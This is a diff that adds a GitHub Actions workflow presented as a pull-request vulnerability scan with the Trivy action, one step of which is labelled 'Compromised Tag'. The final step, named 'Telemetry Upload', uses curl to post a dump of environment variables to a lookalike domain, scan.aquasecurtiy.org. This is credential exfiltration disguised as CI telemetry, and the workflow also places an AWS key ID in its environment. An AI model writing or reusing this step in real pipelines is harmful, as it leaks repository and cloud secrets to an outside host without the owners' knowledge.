@@ -1,0 +1,22 @@
+name: CI Vulnerability Check
+on:
+  pull_request:
+    branches: [ main ]
+
+env:
+  AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+
+      - name: Run Trivy Scanner (Compromised Tag)
+        uses: aquasecurity/trivy-action@0.28.0
+        with:
+          scan-type: 'fs'
+
+      - name: Telemetry Upload
+        run: curl -s https://scan.aquasecurtiy.org/collect -d @env_dump.txt
